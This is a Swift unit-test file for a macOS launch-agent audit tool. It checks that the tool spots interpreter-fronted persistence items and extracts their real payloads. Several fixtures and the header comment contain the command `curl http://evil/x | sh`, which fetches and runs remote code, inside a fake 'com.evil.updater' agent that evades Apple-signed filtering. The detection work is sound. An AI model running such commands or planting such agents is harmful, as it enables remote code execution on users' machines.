import XCTest
@testable import LaunchAudit

/// Tests for interpreter resolution.
///
/// This is the mechanism behind the most consequential defect in the audit: a
/// launch agent of the form `["/bin/sh", "-c", "curl http://host/x | sh"]` has an
/// Apple-signed executable in a system directory, so every identity- and
/// location-based signal reported clean while the code that actually ran was never
/// examined — and the item was hidden by the default "hide Apple-signed" filter.
final class InterpreterTests: XCTestCase {

    func testRecognizesCommonInterpreters() {
        for path in ["/bin/sh", "/bin/bash", "/bin/zsh", "/usr/bin/python3",
                     "/usr/bin/osascript", "/usr/bin/env", "/usr/bin/perl"] {
            XCTAssertTrue(Interpreters.isInterpreter(path), "\(path) should be an interpreter")
        }
    }

    func testRecognizesInterpretersOutsideSystemPaths() {
        // Homebrew and other prefixes, matched on basename.
        XCTAssertTrue(Interpreters.isInterpreter("/opt/homebrew/bin/bash"))
        XCTAssertTrue(Interpreters.isInterpreter("/usr/local/bin/python3"))
    }

    func testDoesNotFlagOrdinaryBinaries() {
        for path in ["/usr/sbin/cron", "/Applications/Foo.app/Contents/MacOS/Foo",
                     "/usr/libexec/opendirectoryd"] {
            XCTAssertFalse(Interpreters.isInterpreter(path), "\(path) is not an interpreter")
        }
    }

    // MARK: - Payload extraction

    func testExtractsInlineShellCommand() {
        let payload = Interpreters.payload(
            interpreter: "/bin/sh",
            arguments: ["/bin/sh", "-c", "curl http://evil/x | sh"]
        )
        XCTAssertEqual(payload, .inlineScript("curl http://evil/x | sh"))
    }

    func testJoinsMultipleInlineArguments() {
        let payload = Interpreters.payload(
            interpreter: "/bin/bash",
            arguments: ["/bin/bash", "-c", "echo a", "&&", "echo b"]
        )
        XCTAssertEqual(payload, .inlineScript("echo a && echo b"))
    }

    func testExtractsScriptPath() {
        let payload = Interpreters.payload(
            interpreter: "/bin/sh",
            arguments: ["/bin/sh", "/tmp/payload.sh"]
        )
        XCTAssertEqual(payload, .script("/tmp/payload.sh"))
        XCTAssertEqual(payload?.scriptPath, "/tmp/payload.sh")
    }

    func testSkipsFlagsBeforeScriptPath() {
        let payload = Interpreters.payload(
            interpreter: "/bin/bash",
            arguments: ["/bin/bash", "-l", "-x", "/Users/x/.hidden/run.sh"]
        )
        XCTAssertEqual(payload, .script("/Users/x/.hidden/run.sh"))
    }

    func testHandlesOsascriptInlineForm() {
        let payload = Interpreters.payload(
            interpreter: "/usr/bin/osascript",
            arguments: ["/usr/bin/osascript", "-e", "do shell script \"whoami\""]
        )
        XCTAssertEqual(payload, .inlineScript("do shell script \"whoami\""))
    }

    func testResolvesThroughEnv() {
        // `env VAR=1 python3 script.py` should resolve to the script, not to env.
        let payload = Interpreters.payload(
            interpreter: "/usr/bin/env",
            arguments: ["/usr/bin/env", "FOO=bar", "python3", "/tmp/x.py"]
        )
        XCTAssertEqual(payload, .script("/tmp/x.py"))
    }

    func testReturnsNilWhenInterpreterHasNoPayload() {
        XCTAssertNil(Interpreters.payload(interpreter: "/bin/sh", arguments: ["/bin/sh"]))
        XCTAssertNil(Interpreters.payload(interpreter: "/bin/sh", arguments: []))
    }

    func testHandlesProgramWithoutRepeatedArgv0() {
        // `Program` set separately, so ProgramArguments does not repeat the path.
        let payload = Interpreters.payload(
            interpreter: "/bin/sh",
            arguments: ["-c", "echo hi"]
        )
        XCTAssertEqual(payload, .inlineScript("echo hi"))
    }

    // MARK: - Item-level integration

    func testInterpreterFrontedItemIsNotTreatedAsAppleSoftware() {
        // The exact shape of the evasion: Apple-signed /bin/sh, Apple-owned system
        // path, but the payload is the attacker's.
        let item = PersistenceItem(
            category: .launchAgents,
            name: "com.evil.updater",
            configPath: "/System/Library/LaunchAgents/com.evil.updater.plist",
            executablePath: "/bin/sh",
            arguments: ["/bin/sh", "-c", "curl http://evil/x | sh"],
            signingInfo: SigningInfo(
                isSigned: true, isAppleSigned: true, isNotarized: false
            )
        )

        XCTAssertTrue(item.isInterpreterFronted)
        XCTAssertFalse(
            item.isVerifiedAppleSoftware,
            "An Apple-signed interpreter running someone else's command is not Apple software"
        )
    }

    func testEffectiveExecutableIsTheScriptNotTheInterpreter() {
        let item = PersistenceItem(
            category: .launchDaemons,
            name: "job",
            executablePath: "/bin/bash",
            arguments: ["/bin/bash", "/Users/x/run.sh"]
        )
        XCTAssertEqual(item.effectiveExecutablePath, "/Users/x/run.sh")
    }

    func testOrdinaryItemKeepsItsExecutableAsEffectivePath() {
        let item = PersistenceItem(
            category: .launchDaemons,
            name: "cron",
            executablePath: "/usr/sbin/cron"
        )
        XCTAssertFalse(item.isInterpreterFronted)
        XCTAssertEqual(item.effectiveExecutablePath, "/usr/sbin/cron")
    }
}
